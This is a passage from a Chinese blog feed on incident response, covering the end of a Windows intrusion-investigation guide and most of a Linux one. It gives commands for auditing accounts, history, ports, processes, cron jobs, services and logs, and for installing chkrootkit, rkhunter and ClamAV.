<code>%UserProfile%\Recent</code>，分析最近打开分析可疑文件。</p><p>c、在服务器各个目录，可根据文件夹内文件列表时间进行排序，查找可疑文件。</p><p>d、回收站、浏览器下载目录、浏览器历史记录</p><p>e、修改时间在创建时间之前的为可疑文件</p></li></ul><p>3、发现并得到 WebShell、远控木马的创建时间，如何找出同一时间范围内创建的文件？</p><p>a、利用 <a href="http://www.torchsoft.com/en/rw_information.html">Registry Workshop</a> 注册表编辑器的搜索功能，可以找到最后写入时间区间的文件。<br>b、利用计算机自带文件搜索功能，指定修改时间进行搜索。</p><h4 id="1-5-自动化查杀">1.5 自动化查杀</h4><ul><li><p>病毒查杀</p><ul><li>检查方法：下载安全软件，更新最新病毒库，进行全盘扫描。</li></ul></li><li><p>webshell查杀</p><ul><li>检查方法：选择具体站点路径进行webshell查杀，建议使用两款 WebShell 查杀工具同时查杀，可相互补充规则库的不足。</li></ul></li></ul><h4 id="1-6-日志分析">1.6 日志分析</h4><p>系统日志</p><ul><li><p>分析方法：</p><p>a、前提：开启审核策略，若日后系统出现故障、安全事故则可以查看系统的日志文件，排除故障，追查入侵者的信息等。</p><p>b、Win+R 打开运行，输入 “eventvwr.msc”，回车运行，打开&quot;事件查看器&quot;。</p><p>C、导出应用程序日志、安全日志、系统日志，利用 <a href="https://www.microsoft.com/en-us/download/details.aspx?id=24659">Log Parser</a> 进行分析。</p></li></ul><p>Web 访问日志</p><ul><li><p>分析方法：</p><p>a、找到中间件的web日志，打包到本地方便进行分析。</p><p>b、推荐工具：Windows 下，推荐用 EmEditor 进行日志分析，支持大文本，搜索效率还不错。Linux 下，使用 Shell 命令组合查询分析。</p></li></ul><h3 id="0x02-工具篇">0x02 工具篇</h3><h4 id="2-1-病毒分析">2.1 病毒分析</h4><p>PCHunter：<a href="http://www.xuetr.com">http://www.xuetr.com</a></p><p>火绒剑：<a href="https://www.huorong.cn">https://www.huorong.cn</a></p><p>Process Explorer：<a href="https://docs.microsoft.com/zh-cn/sysinternals/downloads/process-explorer">https://docs.microsoft.com/zh-cn/sysinternals/downloads/process-explorer</a></p><p>processhacker：<a href="https://processhacker.sourceforge.io/downloads.php">https://processhacker.sourceforge.io/downloads.php</a></p><p>autoruns：<a href="https://docs.microsoft.com/en-us/sysinternals/downloads/autoruns">https://docs.microsoft.com/en-us/sysinternals/downloads/autoruns</a></p><p>OTL：<a href="https://www.bleepingcomputer.com/download/otl/">https://www.bleepingcomputer.com/download/otl/</a></p><p>SysInspector：<a href="http://download.eset.com.cn/download/detail/?product=sysinspector">http://download.eset.com.cn/download/detail/?product=sysinspector</a></p><h4 id="2-2-病毒查杀">2.2 病毒查杀</h4><p>卡巴斯基：<a href="http://devbuilds.kaspersky-labs.com/devbuilds/KVRT/latest/full/KVRT.exe">http://devbuilds.kaspersky-labs.com/devbuilds/KVRT/latest/full/KVRT.exe</a>   （推荐理由：绿色版、最新病毒库）</p><p>大蜘蛛：<a href="http://free.drweb.ru/download+cureit+free%EF%BC%88%E6%8E%A8%E8%8D%90%E7%90%86%E7%94%B1%EF%BC%9A%E6%89%AB%E6%8F%8F%E5%BF%AB%E3%80%81%E4%B8%80%E6%AC%A1%E4%B8%8B%E8%BD%BD%E5%8F%AA%E8%83%BD%E7%94%A81%E5%91%A8%EF%BC%8C%E6%9B%B4%E6%96%B0%E7%97%85%E6%AF%92%E5%BA%93%EF%BC%89">http://free.drweb.ru/download+cureit+free（推荐理由：扫描快、一次下载只能用1周，更新病毒库）</a></p><p>火绒安全软件：<a href="https://www.huorong.cn">https://www.huorong.cn</a></p><p>360杀毒：<a href="http://sd.360.cn/download_center.html">http://sd.360.cn/download_center.html</a></p><h4 id="2-3-病毒动态">2.3 病毒动态</h4><p>CVERC-国家计算机病毒应急处理中心：<a href="http://www.cverc.org.cn">http://www.cverc.org.cn</a></p><p>微步在线威胁情报社区：<a href="https://x.threatbook.cn">https://x.threatbook.cn</a></p><p>火绒安全论坛：<a href="http://bbs.huorong.cn/forum-59-1.html">http://bbs.huorong.cn/forum-59-1.html</a></p><p>爱毒霸社区：<a href="http://bbs.duba.net">http://bbs.duba.net</a></p><p>腾讯电脑管家：<a href="http://bbs.guanjia.qq.com/forum-2-1.html">http://bbs.guanjia.qq.com/forum-2-1.html</a></p><h4 id="2-4-在线病毒扫描网站">2.4 在线病毒扫描网站</h4><p>Virustotal：<a href="https://www.virustotal.com">https://www.virustotal.com</a></p><p>Virscan：<a href="http://www.virscan.org">http://www.virscan.org</a></p><p>腾讯哈勃分析系统：<a href="https://habo.qq.com">https://habo.qq.com</a></p><p>Jotti 恶意软件扫描系统：<a href="https://virusscan.jotti.org">https://virusscan.jotti.org</a></p><h4 id="2-5-webshell查杀">2.5 webshell查杀</h4><p>D盾_Web查杀：<a href="http://www.d99net.net/index.asp">http://www.d99net.net/index.asp</a></p><p>河马 WebShell 查杀：<a href="http://www.shellpub.com">http://www.shellpub.com</a></p>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 应急响应 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>第01章：入侵排查篇第2篇：Linux 入侵排查</title>
      <link href="/posts/6dff2020.html"/>
      <url>/posts/6dff2020.html</url>
      
        <content type="html"><![CDATA[<h2 id="第2篇：Linux-入侵排查">第2篇：Linux 入侵排查</h2><h3 id="0x00-前言">0x00 前言</h3><p>当企业发生黑客入侵、系统崩溃或其它影响业务正常运行的安全事件时，急需第一时间进行处理，使企业的网络信息系统在最短时间内恢复正常工作，进一步查找入侵来源，还原入侵事故过程，同时给出解决方案与防范措施，为企业挽回或减少经济损失。</p><p>针对常见的攻击事件，结合工作中应急响应事件分析和解决的方法，总结了一些 Linux 服务器入侵排查的思路。</p><h3 id="0x01-入侵排查思路">0x01 入侵排查思路</h3><h4 id="1-1-账号安全">1.1 账号安全</h4><p><strong>基本使用：</strong></p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>、用户信息文件 /etc/passwd</span><br><span class="line"><span class="symbol">root:</span><span class="symbol">x:</span><span class="number">0</span><span class="symbol">:</span><span class="number">0</span><span class="symbol">:root</span><span class="symbol">:/root</span><span class="symbol">:/bin/bash</span></span><br><span class="line"><span class="symbol">account:</span><span class="symbol">password:</span><span class="variable constant_">UID</span><span class="symbol">:GID</span><span class="symbol">:GECOS</span><span class="symbol">:directory</span><span class="symbol">:shell</span></span><br><span class="line">用户名：密码：用户<span class="variable constant_">ID</span>：组<span class="variable constant_">ID</span>：用户说明：家目录：登陆之后的 shell</span><br><span class="line">注意：无密码只允许本机登陆，远程不允许登陆</span><br><span class="line"></span><br><span class="line"><span class="number">2</span>、影子文件 /etc/shadow</span><br><span class="line"><span class="symbol">root:</span>$<span class="number">6</span><span class="variable">$oGs1PqhL2p</span>3ZetrE<span class="variable">$X7o7bzoouHQVSEmSgsYN5UD4</span>.kMHx6qgbTqwNVC5oOAouXvcjQSt.<span class="title class_">Ft7ql1WpkopY0UV9ajBwUt1DpYxTCVv</span>I/<span class="symbol">:</span><span class="number">16809</span><span class="symbol">:</span><span class="number">0</span><span class="symbol">:</span><span class="number">99999</span><span class="symbol">:</span><span class="number">7</span><span class="symbol">:</span><span class="symbol">:</span>:</span><br><span class="line">用户名：加密密码：密码最后一次修改日期：两次密码的修改时间间隔：密码有效期：密码修改到期到的警告天数：密码过期之后的宽限天数：账号失效时间：保留</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">who</span>     查看当前登录用户（<span class="built_in">tty</span> 本地登陆  pts 远程登录）</span><br><span class="line">w       查看系统信息，想知道某一时刻用户的行为</span><br><span class="line"><span class="built_in">uptime</span>  查看登陆多久、多少用户，负载状态</span><br></pre></td></tr></table></figure><p><strong>入侵排查：</strong></p><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>、查询特权用户特权用户(uid 为<span class="number">0</span>)</span><br><span class="line">[root@localhost ~]<span class="comment"># awk -F: &#x27;$3==0&#123;print $1&#125;&#x27; /etc/passwd</span></span><br><span class="line"><span class="number">2</span>、查询可以远程登录的帐号信息</span><br><span class="line">[root@localhost ~]<span class="comment"># awk &#x27;/\$1|\$6/&#123;print $1&#125;&#x27; /etc/shadow</span></span><br><span class="line"><span class="number">3</span>、除root帐号外，其他帐号是否存在sudo权限。如非管理需要，普通帐号应删除sudo权限</span><br><span class="line">[root@localhost ~]<span class="comment"># more /etc/sudoers | grep -v &quot;^#\|^$&quot; | grep &quot;ALL=(ALL)&quot;</span></span><br><span class="line"><span class="number">4</span>、禁用或删除多余及可疑的帐号</span><br><span class="line">    usermod -L <span class="keyword">user</span>    <span class="title">禁用帐号，帐号无法登录，/etc</span>/shadow 第二栏为 ! 开头</span><br><span class="line">userdel <span class="keyword">user</span>       <span class="title">删除 user</span> 用户</span><br><span class="line">userdel -r <span class="keyword">user</span>    <span class="title">将删除 user</span> 用户，并且将 /home 目录下的 <span class="keyword">user</span> <span class="title">目录一并删除</span></span><br></pre></td></tr></table></figure><h4 id="1-2-历史命令">1.2 历史命令</h4><p><strong>基本使用：</strong></p><p>通过 .bash_history 文件查看帐号执行过的系统命令</p><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>、root 用户的历史命令</span><br><span class="line">histroy</span><br><span class="line"><span class="number">2</span>、打开 /home 各帐号目录下的 .bash_history，查看普通帐号执行的历史命令。</span><br><span class="line">为历史的命令增加登录的 IP 地址、执行命令时间等信息：</span><br><span class="line"><span class="number">1</span>）保存<span class="number">1</span>万条命令</span><br><span class="line">sed -i <span class="string">&#x27;s/^HISTSIZE=1000/HISTSIZE=10000/g&#x27;</span> /etc/profile</span><br><span class="line"><span class="number">2</span>）在/etc/profile的文件尾部添加如下行数配置信息：</span><br><span class="line">######jiagu history xianshi#########</span><br><span class="line">USER_IP=`who -u am i <span class="number">2</span>&gt;/dev/null | awk <span class="string">&#x27;&#123;print $NF&#125;&#x27;</span> | sed -e <span class="string">&#x27;s/[()]//g&#x27;</span>`</span><br><span class="line"><span class="keyword">if</span> [ <span class="string">&quot;$USER_IP&quot;</span> = <span class="string">&quot;&quot;</span> ]</span><br><span class="line">then</span><br><span class="line">USER_IP=`hostname`</span><br><span class="line">fi</span><br><span class="line"><span class="keyword">export</span> HISTTIMEFORMAT=<span class="string">&quot;%F %T $USER_IP `whoami` &quot;</span></span><br><span class="line">shopt -s histappend</span><br><span class="line"><span class="keyword">export</span> PROMPT_COMMAND=<span class="string">&quot;history -a&quot;</span></span><br><span class="line">######### jiagu history xianshi ##########</span><br><span class="line"><span class="number">3</span>）source /etc/profile 让配置生效</span><br><span class="line">生成效果： <span class="number">1</span>  <span class="number">2018</span><span class="number">-07</span><span class="number">-10</span> <span class="number">19</span>:<span class="number">45</span>:<span class="number">39</span> <span class="number">192.168</span><span class="number">.204</span><span class="number">.1</span> root source /etc/profile</span><br><span class="line"><span class="number">3</span>、历史操作命令的清除：history -c</span><br><span class="line">但此命令并不会清除保存在文件中的记录，因此需要手动删除 .bash_profile 文件中的记录。</span><br></pre></td></tr></table></figure><p><strong>入侵排查：</strong></p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">进入用户目录下，导出历史命令。</span><br><span class="line">cat <span class="string">.bash_history</span> &gt;&gt; <span class="keyword">history</span>.txt</span><br></pre></td></tr></table></figure><h4 id="1-3-检查异常端口">1.3 检查异常端口</h4><p>使用 netstat 网络连接命令，分析可疑端口、IP、PID</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">netstat -antlp | more</span><br><span class="line"></span><br><span class="line">查看下 pid 所对应的进程文件路径，</span><br><span class="line">运行 <span class="built_in">ls</span> -l /proc/<span class="variable">$PID</span>/exe 或 file /proc/<span class="variable">$PID</span>/exe（<span class="variable">$PID</span> 为对应的 pid 号）</span><br></pre></td></tr></table></figure><h4 id="1-4-检查异常进程">1.4 检查异常进程</h4><p>使用 ps 命令，分析进程</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">ps</span> aux | <span class="keyword">grep</span> pid </span><br></pre></td></tr></table></figure><h4 id="1-5-检查开机启动项">1.5 检查开机启动项</h4><p><strong>基本使用：</strong></p><p>系统运行级别示意图：</p><table><thead><tr><th style="text-align:center">运行级别</th><th style="text-align:center">含义</th></tr></thead><tbody><tr><td style="text-align:center">0</td><td style="text-align:center">关机</td></tr><tr><td style="text-align:center">1</td><td style="text-align:center">单用户模式，可以想象为windows的安全模式，主要用于系统修复</td></tr><tr><td style="text-align:center">2</td><td style="text-align:center">不完全的命令行模式，不含NFS服务</td></tr><tr><td style="text-align:center">3</td><td style="text-align:center">完全的命令行模式，就是标准字符界面</td></tr><tr><td style="text-align:center">4</td><td style="text-align:center">系统保留</td></tr><tr><td style="text-align:center">5</td><td style="text-align:center">图形模式</td></tr><tr><td style="text-align:center">6</td><td style="text-align:center">重启动</td></tr></tbody></table><p>查看运行级别命令 <code>runlevel</code></p><p>系统默认允许级别</p><pre><code>vi  /etc/inittabid=3：initdefault  #系统开机后直接进入哪个运行级别</code></pre><p>开机启动配置文件</p><pre><code>/etc/rc.local/etc/rc.d/rc[0~6].d</code></pre><p>例子：当我们需要开机启动自己的脚本时，只需要将可执行脚本丢在 /etc/init.d 目录下，然后在 /etc/rc.d/rc*.d 文件中建立软链接即可。</p><p>注：此中的 * 代表 0,1,2,3,4,5,6 这七个等级</p><pre><code>root@localhost ~]# ln -s /etc/init.d/sshd /etc/rc.d/rc3.d/S100ssh</code></pre><p>此处sshd是具体服务的脚本文件，S100ssh是其软链接，S开头代表加载时自启动；如果是K开头的脚本文件，代表运行级别加载时需要关闭的。</p><p><strong>入侵排查：</strong></p><p>启动项文件：</p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">more <span class="string">/etc/rc.local</span></span><br><span class="line"><span class="string">/etc/rc.d/rc</span>[0~6]<span class="string">.d</span></span><br><span class="line"><span class="keyword">ls</span> -l <span class="string">/etc/rc.d/rc3.d/</span></span><br></pre></td></tr></table></figure><h4 id="1-6-检查定时任务">1.6 检查定时任务</h4><p><strong>基本使用</strong></p><p>1、利用 crontab 创建计划任务</p><ul><li><p>基本命令</p><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">crontab -l   列出某个用户cron服务的详细内容</span><br><span class="line"></span><br><span class="line">Tips：默认编写的crontab文件会保存在 (<span class="keyword">/var/</span>spool<span class="keyword">/cron/</span>用户名 例如: <span class="keyword">/var/</span>spool<span class="keyword">/cron/</span>root</span><br><span class="line"></span><br><span class="line">crontab -r   删除每个用户cront任务(谨慎：删除所有的计划任务)</span><br><span class="line"></span><br><span class="line">crontab -e   使用编辑器编辑当前的crontab文件 </span><br><span class="line"></span><br><span class="line">如：*/<span class="number">1</span> * * * * echo <span class="string">&quot;hello world&quot;</span> &gt;&gt; <span class="keyword">/tmp/</span>test.txt 每分钟写入文件</span><br></pre></td></tr></table></figure></li></ul><p>2、利用 anacron 命令实现异步定时任务调度</p><ul><li><p>使用案例</p><figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">每天运行 <span class="regexp">/home/</span>backup.sh 脚本：</span><br><span class="line">vi <span class="regexp">/etc/</span>anacrontab </span><br><span class="line"><span class="meta">@daily</span>    <span class="number">10</span>    example.daily   <span class="regexp">/bin/</span>bash <span class="regexp">/home/</span>backup.sh</span><br><span class="line">当机器在 backup.sh 期望被运行时是关机的，anacron会在机器开机十分钟之后运行它，而不用再等待 <span class="number">7</span>天<span class="operator">。</span></span><br></pre></td></tr></table></figure></li></ul><p><strong>入侵排查</strong></p><p>重点关注以下目录中是否存在恶意脚本</p><pre><code>/var/spool/cron/* /etc/crontab/etc/cron.d/*/etc/cron.daily/* /etc/cron.hourly/* /etc/cron.monthly/*/etc/cron.weekly//etc/anacrontab/var/spool/anacron/*</code></pre><p>小技巧：</p><pre><code>more /etc/cron.daily/*  查看目录下所有文件</code></pre><h4 id="1-7-检查服务">1.7 检查服务</h4><p><strong>服务自启动</strong></p><p>第一种修改方法：</p><pre><code>chkconfig [--level 运行级别] [独立服务名] [on|off]chkconfig –level  2345 httpd on  开启自启动chkconfig httpd on （默认level是2345）</code></pre><p>第二种修改方法：</p><pre><code>修改 /etc/re.d/rc.local 文件  加入 /etc/init.d/httpd start</code></pre><p>第三种修改方法：</p><p>使用 ntsysv 命令管理自启动，可以管理独立服务和 xinetd 服务。</p><p><strong>入侵排查</strong></p><p>1、查询已安装的服务：</p><p>RPM 包安装的服务</p><pre><code>chkconfig  --list  查看服务自启动状态，可以看到所有的RPM包安装的服务ps aux | grep crond 查看当前服务系统在3与5级别下的启动项 中文环境chkconfig --list | grep &quot;3:启用\|5:启用&quot;英文环境chkconfig --list | grep &quot;3:on\|5:on&quot;</code></pre><p>源码包安装的服务</p><pre><code>查看服务安装位置 ，一般是在/user/local/service httpd start搜索/etc/rc.d/init.d/  查看是否存在</code></pre><h4 id="1-8-检查异常文件">1.8 检查异常文件</h4><p>1、查看敏感目录，如/tmp目录下的文件，同时注意隐藏文件夹，以“…”为名的文件夹具有隐藏属性</p><p>2、得到发现WEBSHELL、远控木马的创建时间，如何找出同一时间范围内创建的文件？</p><p>​可以使用find命令来查找，如  find /opt -iname “*” -atime 1 -type f 找出 /opt 下一天前访问过的文件</p><p>3、针对可疑文件可以使用 stat 进行创建修改时间。</p><h4 id="1-9-检查系统日志">1.9 检查系统日志</h4><p>日志默认存放位置：/var/log/</p><p>查看日志配置情况：more /etc/rsyslog.conf</p><table><thead><tr><th style="text-align:center">日志文件</th><th style="text-align:center">说明</th></tr></thead><tbody><tr><td style="text-align:center">/var/log/cron</td><td style="text-align:center">记录了系统定时任务相关的日志</td></tr><tr><td style="text-align:center">/var/log/cups</td><td style="text-align:center">记录打印信息的日志</td></tr><tr><td style="text-align:center">/var/log/dmesg</td><td style="text-align:center">记录了系统在开机时内核自检的信息，也可以使用dmesg命令直接查看内核自检信息</td></tr><tr><td style="text-align:center">/var/log/mailog</td><td style="text-align:center">记录邮件信息</td></tr><tr><td style="text-align:center">/var/log/message</td><td style="text-align:center">记录系统重要信息的日志。这个日志文件中会记录Linux系统的绝大多数重要信息，如果系统出现问题时，首先要检查的就应该是这个日志文件</td></tr><tr><td style="text-align:center">/var/log/btmp</td><td style="text-align:center">记录错误登录日志，这个文件是二进制文件，不能直接vi查看，而要使用lastb命令查看</td></tr><tr><td style="text-align:center">/var/log/lastlog</td><td style="text-align:center">记录系统中所有用户最后一次登录时间的日志，这个文件是二进制文件，不能直接vi，而要使用lastlog命令查看</td></tr><tr><td style="text-align:center">/var/log/wtmp</td><td style="text-align:center">永久记录所有用户的登录、注销信息，同时记录系统的启动、重启、关机事件。同样这个文件也是一个二进制文件，不能直接vi，而需要使用last命令来查看</td></tr><tr><td style="text-align:center">/var/log/utmp</td><td style="text-align:center">记录当前已经登录的用户信息，这个文件会随着用户的登录和注销不断变化，只记录当前登录用户的信息。同样这个文件不能直接vi，而要使用w,who,users等命令来查询</td></tr><tr><td style="text-align:center">/var/log/secure</td><td style="text-align:center">记录验证和授权方面的信息，只要涉及账号和密码的程序都会记录，比如SSH登录，su切换用户，sudo授权，甚至添加用户和修改用户密码都会记录在这个日志文件中</td></tr></tbody></table><p>日志分析技巧：</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">1、定位有多少IP在爆破主机的root帐号：    </span><br><span class="line">grep <span class="string">&quot;Failed password for root&quot;</span> /var/log/secure | awk <span class="string">&#x27;&#123;print $11&#125;&#x27;</span> | sort | uniq -c | sort -nr | more</span><br><span class="line"></span><br><span class="line">定位有哪些IP在爆破：</span><br><span class="line">grep <span class="string">&quot;Failed password&quot;</span> /var/log/secure|grep -E -o <span class="string">&quot;(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)&quot;</span>|uniq -c</span><br><span class="line"></span><br><span class="line">爆破用户名字典是什么？</span><br><span class="line">grep <span class="string">&quot;Failed password&quot;</span> /var/log/secure|perl -e <span class="string">&#x27;while($_=&lt;&gt;)&#123; /for(.*?) from/; print &quot;$1\n&quot;;&#125;&#x27;</span>|uniq -c|sort -nr</span><br><span class="line"> </span><br><span class="line">2、登录成功的IP有哪些： </span><br><span class="line">grep <span class="string">&quot;Accepted &quot;</span> /var/log/secure | awk <span class="string">&#x27;&#123;print $11&#125;&#x27;</span> | sort | uniq -c | sort -nr | more</span><br><span class="line"></span><br><span class="line">登录成功的日期、用户名、IP：</span><br><span class="line">grep <span class="string">&quot;Accepted &quot;</span> /var/log/secure | awk <span class="string">&#x27;&#123;print $1,$2,$3,$9,$11&#125;&#x27;</span> </span><br><span class="line"></span><br><span class="line">3、增加一个用户kali日志：</span><br><span class="line">Jul 10 00:12:15 localhost useradd[2382]: new group: <span class="attribute">name</span>=kali, <span class="attribute">GID</span>=1001</span><br><span class="line">Jul 10 00:12:15 localhost useradd[2382]: new user: <span class="attribute">name</span>=kali, <span class="attribute">UID</span>=1001, <span class="attribute">GID</span>=1001, <span class="attribute">home</span>=/home/kali</span><br><span class="line">, <span class="attribute">shell</span>=/bin/bash</span><br><span class="line">Jul 10 00:12:58 localhost passwd: pam_unix(passwd:chauthtok): password changed <span class="keyword">for</span> kali</span><br><span class="line"><span class="comment">#grep &quot;useradd&quot; /var/log/secure </span></span><br><span class="line"></span><br><span class="line">4、删除用户kali日志：</span><br><span class="line">Jul 10 00:14:17 localhost userdel[2393]: delete<span class="built_in"> user </span><span class="string">&#x27;kali&#x27;</span></span><br><span class="line">Jul 10 00:14:17 localhost userdel[2393]: removed<span class="built_in"> group </span><span class="string">&#x27;kali&#x27;</span> owned by <span class="string">&#x27;kali&#x27;</span></span><br><span class="line">Jul 10 00:14:17 localhost userdel[2393]: removed shadow<span class="built_in"> group </span><span class="string">&#x27;kali&#x27;</span> owned by <span class="string">&#x27;kali&#x27;</span></span><br><span class="line"><span class="comment"># grep &quot;userdel&quot; /var/log/secure</span></span><br><span class="line"></span><br><span class="line">5、su切换用户：</span><br><span class="line">Jul 10 00:38:13 localhost su: pam_unix(su-l:session): session opened <span class="keyword">for</span><span class="built_in"> user </span>good by root(<span class="attribute">uid</span>=0)</span><br><span class="line"></span><br><span class="line">sudo授权执行:</span><br><span class="line">sudo -l</span><br><span class="line">Jul 10 00:43:09 localhost sudo:    good : <span class="attribute">TTY</span>=pts/4 ; <span class="attribute">PWD</span>=/home/good ; <span class="attribute">USER</span>=root ; <span class="attribute">COMMAND</span>=/sbin/shutdown -r now</span><br></pre></td></tr></table></figure><h3 id="0x02-工具篇">0x02 工具篇</h3><h4 id="2-1-Rootkit查杀">2.1 Rootkit查杀</h4><ul><li><p>chkrootkit</p><p>网址：<a href="http://www.chkrootkit.org">http://www.chkrootkit.org</a></p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">使用方法：</span><br><span class="line">wget ftp:<span class="regexp">//</span>ftp.pangeia.com.br<span class="regexp">/pub/</span>seg<span class="regexp">/pac/</span>chkrootkit.tar.gz</span><br><span class="line">tar zxvf chkrootkit.tar.gz</span><br><span class="line">cd chkrootkit-<span class="number">0.52</span></span><br><span class="line">make sense</span><br><span class="line"><span class="comment">#编译完成没有报错的话执行检查</span></span><br><span class="line">./chkrootkit</span><br></pre></td></tr></table></figure></li><li><p>rkhunter</p><p>网址：<a href="http://rkhunter.sourceforge.net">http://rkhunter.sourceforge.net</a></p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">使用方法：</span><br><span class="line">Wget https:<span class="comment">//nchc.dl.sourceforge.net/project/rkhunter/rkhunter/1.4.4/rkhunter-1.4.4.tar.gz</span></span><br><span class="line">tar -zxvf rkhunter-<span class="number">1.4</span>.<span class="number">4</span><span class="selector-class">.tar</span><span class="selector-class">.gz</span></span><br><span class="line">cd rkhunter-<span class="number">1.4</span>.<span class="number">4</span></span><br><span class="line">./installer<span class="selector-class">.sh</span> <span class="attr">--install</span></span><br><span class="line">rkhunter -c</span><br></pre></td></tr></table></figure></li></ul><h4 id="2-2-病毒查杀">2.2 病毒查杀</h4><ul><li><p>Clamav</p><p>网址：<a href="http://www.clamav.net/download.html">http://www.clamav.net/download.html</a></p><p>安装方式一：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">1、安装 zlib：</span><br><span class="line">wget http://nchc.dl.sourceforge.net/project/libpng/zlib/1.2.7/zlib-1.2.7.tar.gz </span><br><span class="line">tar -zxvf  zlib-1.2.7.tar.gz</span><br><span class="line"><span class="built_in">cd</span> zlib-1.2.7</span><br><span class="line"><span class="comment">#安装一下gcc编译环境： yum install gcc</span></span><br><span class="line">CFLAGS=<span class="string">&quot;-O3 -fPIC&quot;</span> ./configure --prefix= /usr/local/zlib/</span><br><span class="line">make &amp;&amp; make install</span><br><span class="line"></span><br><span class="line">2、添加用户组 clamav 和组成员 clamav：</span><br><span class="line">groupadd clamav</span><br><span class="line">useradd -g clamav -s /bin/false -c <span class="string">&quot;Clam AntiVirus&quot;</span> clamav</span><br><span class="line"></span><br><span class="line">3、安装 Clamav</span><br><span class="line">tar –zxvf clamav-0.97.6.tar.gz</span><br><span class="line"><span class="built_in">cd</span> clamav-0.97.6</span><br><span class="line">./configure --prefix=/opt/clamav --disable-clamav -with-zlib=/usr/local/zlib</span><br><span class="line">make</span><br><span class="line">make install</span><br><span class="line"></span><br><span class="line">4、配置 Clamav</span><br><span class="line"><span class="built_in">mkdir</span> /opt/clamav/logs</span><br><span class="line"><span class="built_in">mkdir</span> /opt/clamav/updata</span><br><span class="line"><span class="built_in">touch</span> /opt/clamav/logs/freshclam.log</span><br><span class="line"><span class="built_in">touch</span> /opt/clamav/logs/clamd.log</span><br><span class="line"><span class="built_in">cd</span> /opt/clamav/logs</span><br><span class="line"><span class="built_in">chown</span> clamav:clamav 